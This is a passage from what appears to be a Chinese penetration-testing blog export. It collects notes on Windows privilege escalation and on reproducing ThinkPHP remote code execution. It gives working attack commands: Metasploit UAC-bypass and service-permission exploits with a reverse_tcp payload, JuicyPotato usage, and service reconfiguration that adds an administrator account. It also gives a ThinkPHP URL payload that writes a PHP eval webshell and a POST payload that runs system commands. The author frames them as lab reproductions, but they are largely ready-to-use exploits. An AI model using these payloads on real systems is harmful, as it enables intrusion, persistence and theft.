href="https://github.com/decoder-it/pipeserverimpersonate/blob/master/pipeserverimpersonate.ps1">https://github.com/decoder-it/pipeserverimpersonate/blob/master/pipeserverimpersonate.ps1</a>  </p></blockquote><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">powershell -ep <span class="hljs-keyword">bypass </span>-f pipeserverimpersonate.ps1<br></code></pre></td></tr></table></figure><p>win7查看命名管道</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren">[<span class="hljs-title class_">System</span>.<span class="hljs-property">IO</span>.<span class="hljs-property">Directory</span>]::<span class="hljs-title class_">GetFiles</span>(<span class="hljs-string">&quot;<span class="hljs-char escape_">\\</span>.<span class="hljs-char escape_">\\</span>pipe<span class="hljs-char escape_">\\</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>win7及以上</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-comment"># 返回对象列表</span><br><span class="hljs-built_in">get-childitem</span> \\.\<span class="hljs-string">pipe</span>\<br><span class="hljs-comment"># 只显示名称</span><br>(<span class="hljs-built_in">get-childitem</span> \\.\<span class="hljs-string">pipe</span>\).<span class="hljs-string">FullName</span><br></code></pre></td></tr></table></figure><p>记得更改命名管道的名字，不然不太好找</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213130958883.png" alt="image-20240213130958883"></p><p>再开启</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213131127542.png" alt="image-20240213131127542"></p><p>发现他有提示的</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213131151009.png" alt="image-20240213131151009"></p><p>发现已经开启了</p></li><li><p>创建服务</p><p>因为我们需要获取 高权限的 token，通过服务方式启动的客户端时system 权限，所以我们就可以通过服务开启的客户端获取 token</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>create august-pipe <span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;cmd /c echo test &gt; \\.\pipe\august&quot;</span><br><span class="hljs-keyword">sc </span>qc august-pipe\ <span class="hljs-comment">#查询该服务的配置信息</span><br></code></pre></td></tr></table></figure><p> <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213132646902.png" alt="image-20240213132646902"></p></li><li><p>启动服务</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213132749253.png" alt="image-20240213132749253"></p><p>然后成功反弹一个system 的cmd</p></li><li><p>尝试修改为payload 让其直接运行</p><p>修改pipeserverimpersonate.ps1</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213132927207.png" alt="image-20240213132927207"></p><p>修改为paylload </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213133035988.png" alt="image-20240213133035988"></p><p>然后重复上面的工作</p><p>开启pipeserverimpersonate,ps1</p><p>由于已经注册了服务，现在就直接运行服务就行了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213133245630.png" alt="image-20240213133245630"></p><p>反弹了一个system 的cmd</p></li></ol><h2 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h2><p>UAC：用户帐户控制（User Account Control），是windows操作系统中采用的一种控制机制，它以预见的方式阻止不必要的系统范围更改 getsystem提权方式对于普通用户来说是失败的不可正常执行的，那么这种情况下就需要绕过系统UAC来进行getsystem提权</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/windows/local/bypassuac<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> <span class="hljs-attribute">LHOST</span>=192.168.1.170<br><span class="hljs-built_in">set</span> session 1<br>exploit<br></code></pre></td></tr></table></figure><p>尝试获取win10 的system</p><p>对于win10 还是没有办法</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213135852769.png" alt="image-20240213135852769"></p><p>如果执行成功了，那么就会直接返回两个system 的会话</p><p>尝试其他的方式</p><blockquote><p>bypassuac_injection  </p><p>bypassuac_eventvwr</p><p>bypassuac_comhijack  </p></blockquote><p>也是不能成功的</p><h2 id="Local-exploit-suggester"><a href="#Local-exploit-suggester" class="headerlink" title="Local_exploit_suggester"></a>Local_exploit_suggester</h2><blockquote><p>local_exploit_suggester是一个漏洞利用后渗透模块，可用于检查系统中是否存在本地漏洞。它  执行本地漏洞利用检查；但不运行利用任何漏洞，这意味着可以在不进行入侵的情况下扫描系统。  不必手动搜索有效的本地漏洞；它将根据系统的平台和体系结构向您显示目标容易受到哪些攻击。  </p></blockquote><blockquote><p>优点：省去手动查找本地漏洞的麻烦，节省时间  </p><p>缺点：不是所有列出的local exploit都可用  </p></blockquote><p>还是对win10 机型进行收集</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> <span class="hljs-keyword">post</span>/multi/recon/local_exploit_suggester<br><span class="hljs-keyword">set</span> SESSION 7<br>exploit<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213141949694.png" alt="image-20240213141949694"></p><p>这个是他收集的结果win10 真的不太好利用了</p><h2 id="Windows内核漏洞提权"><a href="#Windows内核漏洞提权" class="headerlink" title="Windows内核漏洞提权"></a>Windows内核漏洞提权</h2><h3 id="windows-kernel-exploits"><a href="#windows-kernel-exploits" class="headerlink" title="windows-kernel-exploits"></a>windows-kernel-exploits</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SecWiki/</span>windows-kernel-exploits<br>https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>system/<span class="hljs-number">184289</span>.html<br></code></pre></td></tr></table></figure><p>metasploit中查找提权模块</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">search</span> exploit<span class="hljs-operator">/</span>windows<span class="hljs-operator">/</span><span class="hljs-keyword">local</span> Privilege<br><span class="hljs-keyword">search</span> ms<br></code></pre></td></tr></table></figure><h2 id="JuicyPotato"><a href="#JuicyPotato" class="headerlink" title="JuicyPotato"></a>JuicyPotato</h2><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">juicypotato.exe -t * -p <span class="hljs-string">&quot;6666.exe&quot;</span> -l <span class="hljs-number">9001</span> -c &#123;4991d34b-80a1-<span class="hljs-number">4291</span>-<span class="hljs-number">83b6</span>-<span class="hljs-number">3328366b9097</span>&#125;<br></code></pre></td></tr></table></figure><p>也就是指定我们的payload 然后让它执行，就可以获取对应的权限</p><p>或者直接使用msf 的模块</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240213143838260.png" alt="image-20240213143838260"></p><p>只是需要注意使用这个模块的话，需要有对应的权限</p><h2 id="Windows系统服务漏洞"><a href="#Windows系统服务漏洞" class="headerlink" title="Windows系统服务漏洞"></a>Windows系统服务漏洞</h2><h3 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h3><h4 id="手动"><a href="#手动" class="headerlink" title="手动"></a>手动</h4><ol><li><p>简介</p><blockquote><p>任意用户以NT AUTHORITY\SYSTEM权限安装MSI安装包。  </p><p>MSI：Microsoft Silent Installer，是微软的安装包格式，它在后台运行.exe安装程序</p><p>AlwaysInstallElevated 是一个策略设置，当在系统中使用Windows Installer安装任何程序时，该  参数允许非特权用户以system权 限运行MSI文件。  </p><p>如果目标系统上启用了这一设置，我们可以使用msf生成msi文件来以system权限执行任意payload。</p></blockquote></li><li><p>判断是否启用此策略</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">reg query HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br></code></pre></td></tr></table></figure><p>收到 “错误：系统无法找到指定的注册表项或值” 的错误，则表示此注册表值从未创建。 说明策略没有启用。  </p><p>收到 “AlwaysInstallElevated REG_DWORD 0x1”，说明策略已经启用。  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240213155034861.png" alt="image-20240213155034861"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213155156615.png" alt="image-20240213155156615"></p></li><li><p>启用 Always  Install Elevated  </p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d <span class="hljs-number">1</span><br>reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d <span class="hljs-number">1</span><br><br>HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Install        (AlwaysInstalledElevated=<span class="hljs-number">1</span>)<br>HKEY_CURRENT_USER\Software\Policies\Microsof\Windows\Installer        (AlwaysInstalledElevated=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure></li><li><p>Always Install Elevated提权利用  </p><ol><li><p>安装打包器</p><blockquote><p><a href="https://www.exemsi.com/download/">Free Download - MSI Wrapper Convert EXE to MSI free (exemsi.com)</a></p></blockquote></li><li><p>生成payload </p></li><li><p>将payload打包成msi </p></li><li><p>然后再受害者上安装，这个时候就是system权限</p></li></ol></li></ol><h4 id="自动"><a href="#自动" class="headerlink" title="自动"></a>自动</h4><p>就直接使用对应的模块就行了</p><p>  always_install_elevated模块  </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/windows/local/always_install_elevated<br><span class="hljs-built_in">set</span> sessions 1<br><span class="hljs-built_in">run</span><br><br></code></pre></td></tr></table></figure><h3 id="可信任服务路径"><a href="#可信任服务路径" class="headerlink" title="可信任服务路径"></a>可信任服务路径</h3><blockquote><p>存在缺陷的服务程序利用属于可执行文件的文件&#x2F;文件夹权限，Windows服务通常都是以System权限  运行的，所以系统在解析服务的二进制文件对应的文件路径中的空格的时候也会以系统权限进行解  析。如果我们能利用这一特性，就有机会进行权限升。 </p></blockquote><p>简单的说就是，使用有一个可以写入的权限，然后我们将我们的payload 放置于里面然后服务就会按照他的路径进行寻找，就会执行我们的payload ，由于是服务启动，所以达到了提权的效果</p><blockquote><p>利用：通过查找系统服务文件中存在的非引用路径，如果一个服务调用可执行文件，没有正确处理引  用的全路径名，则可利用此漏洞。  </p></blockquote><h4 id="手动-1"><a href="#手动-1" class="headerlink" title="手动"></a>手动</h4><ol><li><p>检测目标是否存在漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic service get name,displayname,pathname,startmode|findstr /i <span class="hljs-string">&quot;Auto&quot;</span> |findstr /i /v <span class="hljs-string">&quot;C:\Windows\\&quot;</span> |findstr/i /v <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213152223202.png" alt="image-20240213152223202"></p><p>存在且发现路径</p></li><li><p>查看路径是否存在可写入的权限</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">icacls &quot;C:\Program Files (x86)\&quot;<br><br>F =完全控制<br>CI =容器继承 - 此标志指示从属容器将继承此ACE。<br>OI = <span class="hljs-keyword">Object</span> <span class="hljs-keyword">Inherit</span> - 这个标志表示从属文件将继承ACE。<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213153134761.png" alt="image-20240213153134761"></p><p>因为我这个后面就是空格，所以使用这个方式</p></li><li><p>生成一个payload </p><p>注意名字一定要与第二个文件夹名空格的前部分一致</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213153320091.png" alt="image-20240213153320091"></p></li><li><p>将这个payload 放入对应的路径</p><p>我这里时c:\program files (x86) </p></li><li><p>然后重启服务就好了</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">sc</span> qc <span class="hljs-string">&quot;Windows Folder Service&quot;</span><br><span class="hljs-keyword">sc</span> stop &quot;Windows Folder Service”<br><span class="hljs-keyword">sc</span> start <span class="hljs-string">&quot;Windows Folder Service&quot;</span><br>没有权限重启服务，等待服务器重启时执行exe<br></code></pre></td></tr></table></figure></li><li><p>可能会遇到反弹回来的shell 容易断掉的问题</p><p>这是因为当一个  服务在Windows系统中启动后，它必须和服务控制管理器通信。如果没有通信，服务控制管理器会认为出现了错误，并会终止这个进程。</p><p>尝试使用其他类型的payload</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213154039864.png" alt="image-20240213154039864"></p></li></ol><h4 id="msf-自动"><a href="#msf-自动" class="headerlink" title="msf 自动"></a>msf 自动</h4><p>使用nquoted_service_path</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/unquoted_service_path<br><span class="hljs-keyword">set</span> session 1<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><h3 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h3><h4 id="手动-2"><a href="#手动-2" class="headerlink" title="手动"></a>手动</h4><blockquote><p>Windows系统服务文件在操作系统启动时会加载执行，并且在后台调用可执行文件。  JAVA升级程序，每次重启系统时，JAVA升级程序会检测Oracle网站，是否有新版JAVA程序。  </p><p>而类似JAVA程序之类的系统服务程序加载时往往都是运行在系统权限上的。所以如果一个低权限的用  户对于此类系统服务调用的可执行文件具有可写的权限，那么就可以将其替换成我们的恶意可执行文  件，从而随着系统启动服务而获得系统权限。  </p><p>直接修改服务的“ImagePath”注册表值，而不是修改服务属性。</p></blockquote><ol><li><p>利用accesschk工具检查易受到攻击的服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">accesschk64.exe -ucqv <span class="hljs-string">&quot;Authenticated Users&quot;</span> * /accepteula<br>services_all_access<br></code></pre></td></tr></table></figure></li><li><p>查看可完全控制的服务的属性</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sc qc Acunetix</span><br></code></pre></td></tr></table></figure></li><li><p>修改服务配置执行命令</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span><span class="hljs-built_in">config</span> Acunetix <span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;net user updateuser password /add&quot;</span><br><span class="hljs-keyword">sc </span>stop Acunetix<br><span class="hljs-keyword">sc </span>start Acunetix<br><span class="hljs-keyword">sc </span><span class="hljs-built_in">config</span> Acunetix <span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;net localgroup Administrators updateuser /add&quot;</span><br><span class="hljs-keyword">sc </span>start Acunetix<br></code></pre></td></tr></table></figure></li></ol><h4 id="msf-自动-1"><a href="#msf-自动-1" class="headerlink" title="msf 自动"></a>msf 自动</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/windows/local/service_permissions<br><span class="hljs-built_in">set</span> sessions 1<br><span class="hljs-built_in">run</span><br><br></code></pre></td></tr></table></figure><h1 id="cs"><a href="#cs" class="headerlink" title="cs"></a>cs</h1><h2 id="Elevate"><a href="#Elevate" class="headerlink" title="Elevate"></a>Elevate</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213162845866.png" alt="image-20240213162845866"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213163007725.png" alt="image-20240213163007725"></p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Thinkphp漏洞整理</title>
    <link href="/2024/02/12/%E6%95%B4%E7%90%86/Thinkphp%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/"/>
    <url>/2024/02/12/%E6%95%B4%E7%90%86/Thinkphp%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="Thinkphp5-0-20-RCE"><a href="#Thinkphp5-0-20-RCE" class="headerlink" title="Thinkphp5.0.20_RCE"></a>Thinkphp5.0.20_RCE</h2><p>0x00</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Thinkphp%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240212175935246.png" alt="image-20240212175935246"></p><p>随便访问一个路径，然后获取报错信息</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Thinkphp%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240212181459575.png" alt="image-20240212181459575"></p><p>5.0.* 版本</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Thinkphp%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240212181124540.png" alt="image-20240212181124540"></p><p>thinkphp相关工具扫描结果发现路由过滤不严谨</p><p>那就直接使用payload 尝试</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[ccc]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>写入webshell</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Thinkphp%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240212181708466.png" alt="image-20240212181708466"></p><p>27是成功写入的字符数</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Thinkphp%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240212181802779.png" alt="image-20240212181802779"></p><h2 id="Thinkphp5-0-23-RCE"><a href="#Thinkphp5-0-23-RCE" class="headerlink" title="Thinkphp5.0.23_RCE"></a><strong>Thinkphp5.0.23_RCE</strong></h2><p>0x00</p><p>直接尝试写入webshll</p><p>写入失败</p><p>0x01</p><p>尝试使用其他方式</p><p>post </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/index.php?<span class="hljs-attribute">s</span>=captcha<br></code></pre></td></tr></table></figure><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">_method=__construct&amp;filter[]=system&amp;<span class="hljs-keyword">method</span>=<span class="hljs-title function_">get</span>&amp;<span class="hljs-title function_">server</span>[<span class="hljs-title function_">REQUEST_METHOD</span>]=<span class="hljs-title function_">pwd</span>#<span class="hljs-title function_">POST</span>传入参数<br><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Thinkphp%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240212184610488.png" alt="image-20240212184610488"></p><p>利用成功</p><h2 id="Thinkphp5-1-RCE"><a href="#Thinkphp5-1-RCE" class="headerlink" title="Thinkphp5.1_RCE"></a>Thinkphp5.1_RCE</h2><p>0x00</p><p>直接使用payload</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Thinkphp%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240212185121325.png" alt="image-20240212185121325"></p><h1 id="ThinkPHP5远程命令执行漏洞"><a href="#ThinkPHP5远程命令执行漏洞" class="headerlink" title="ThinkPHP5远程命令执行漏洞"></a>ThinkPHP5远程命令执行漏洞</h1><p>0x00 部署thinkphp5</p><ol><li><p>在centos 机器中，检查端口的开放情况</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Thinkphp%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240212185859952.png" alt="image-20240212185859952"></p><p>确保Apache   mysql  php都开启</p></li><li><p>将ThinkPHP 5.1beta源码放到网站根目录&#x2F;var&#x2F;www&#x2F;html</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Thinkphp%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240212190129584.png" alt="image-20240212190129584"></p></li><li><p>尝试访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Thinkphp%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240212190322782.png" alt="image-20240212190322782"></p><p>部署成功</p></li></ol><p>0x01  漏洞复现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python tp5-getshell.py -u http://<span class="hljs-number">10.1</span><span class="hljs-number">.1</span><span class="hljs-number">.100</span>/thinkphp5<span class="hljs-number">.1</span>beta/public/<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Thinkphp%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240212193111807.png" alt="image-20240212193111807"></p><p>利用成功</p><p>getshell </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Thinkphp%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240212193246786.png" alt="image-20240212193246786"></p><p>获取成功</p>]]></content>
    
    
    
    <tags>
      
      <tag>整理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统提权</title>
    <link href="/2024/02/12/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/"/>
    <url>/2024/02/12/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>对于提权的目的，由于有些情况之下我们需要做某些一些操作的时候没有权限，我们只能使用提权的方式进行权限提升，以此来完成我们的操作</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>windwos 中常见的权限</p><ul><li>用户权限( users )</li><li>管理员权限( administrator )</li><li>系统权限( system ) </li><li>访客权限( guest )</li></ul><p>windows 提权</p><blockquote><p><strong>user</strong> –&gt; administrator  </p><p><strong>administrator</strong> –&gt; system  </p><p><strong>services</strong> –&gt; system  </p></blockquote><p>linux 提权</p><blockquote><p>user –&gt; root</p></blockquote><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul><li><p>本地提权</p><p>在一个低权限用户下，通过一些条件（应用程序漏洞、系统漏洞等）提升到系统管理员权限或系统最高权限。</p></li><li><p>远程提权<br>攻击者通过漏洞利用程序直接获取远程服务器的权限。</p></li><li><p>操作系统提权</p><p>Windows：MS06-067、MS10-084、MS11-014、MS11-05、MS12-020、MS16-032 等  </p><p>Linux：CVE-2017-7308、CVE-2017-6074、CVE-2017-5123、CVE-2016-9793、CVE-2016-5195 等</p></li><li><p>应用程序提权</p><p>  SQL Server、MySQL、Oracle等</p></li></ul><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><ul><li>拥有Webshell&#x2F;Beacon&#x2F;Sessions  </li><li>拥有普通用户权限  </li><li>拥有某些软件的账号密码  </li><li>本地或远程服务器上存在漏洞  </li><li>拥有漏洞利用工具代码</li></ul><h1 id="windows-系统提权"><a href="#windows-系统提权" class="headerlink" title="windows 系统提权"></a>windows 系统提权</h1><h2 id="提权思路"><a href="#提权思路" 